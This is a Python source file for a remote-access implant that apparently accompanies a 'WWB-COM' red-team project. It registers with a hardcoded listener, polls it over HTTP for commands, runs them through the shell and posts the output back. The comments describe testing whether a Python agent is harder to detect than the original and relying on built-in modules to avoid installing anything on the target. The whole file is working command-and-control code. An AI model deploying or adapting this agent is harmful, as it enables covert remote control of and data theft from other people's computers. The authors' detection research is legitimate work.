import http.client
import os
import time
import subprocess

#This script is setup to work with the same listener for this project as the WWB-COM agent.  
#While this project was primarily to test WWB-COM basic, I was curious if detectability would be different with a python agent, so here it is.
#Setup to use http.client to avoid installing requests / use what was native on the host I was testing against.  
 
def main():
    server_ip = "192.168.44.3"
    server_port = 5074
    serial_number = "12345"
    computer_name = os.environ.get("COMPUTERNAME", "Unknown")
    polling_delay = 10  # Default polling interval in seconds
 
    # Register with the server
    register_message = f"register|{serial_number}|{computer_name}"
    send_message_to_server(server_ip, server_port, register_message)
 
    # Main loop to fetch and execute commands
    while True:
        get_command_message = f"get_command|{serial_number}"
        command = send_message_to_server(server_ip, server_port, get_command_message)
 
        if command:
            parts = command.split("|")
            if parts[0] not in ["no_command", ""]:
                # Execute the received command
                result = execute_command(parts[0])
                
                # Report the result back to the server
                report_result_message = f"report_result|{serial_number}|{result}"
                send_message_to_server(server_ip, server_port, report_result_message)
 
            # Adjust polling time dynamically if server suggests a wait time
            if len(parts) > 1:
                try:
                    polling_delay = int(parts[1])
                except ValueError:
                    polling_delay = 10  # Default to 10 seconds if parsing fails
 
        # Pause for the polling delay
        time.sleep(polling_delay)
 
def send_message_to_server(server_ip, server_port, message):
    """
    Sends a message to the server using HTTP POST and returns the response.
    """
    try:
        conn = http.client.HTTPConnection(server_ip, server_port, timeout=5)
        headers = {"Content-Type": "text/plain"}
        conn.request("POST", "/", body=message, headers=headers)
        response = conn.getresponse()
        return response.read().decode()
    except Exception as e:
        return f"Error communicating with server: {e}"
    finally:
        conn.close()
 
def execute_command(command):
    """
    Executes a command on the local system and returns the result.
    """
    try:
        # Handle GUI commands (e.g., calc.exe, notepad.exe)
        if "calc.exe" in command or "notepad.exe" in command:
            subprocess.Popen(command, shell=True)
            return f"Executed: {command}"
        else:
            # Handle CLI commands and capture output
            result = subprocess.run(
                command,
                shell=True,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            if result.stderr:
                return f"Command: {command}\nError: {result.stderr.strip()}"
            return f"Command: {command}\nOutput: {result.stdout.strip()}"
    except Exception as e:
        return f"Error executing command '{command}': {e}"
 
if __name__ == "__main__":
    main()
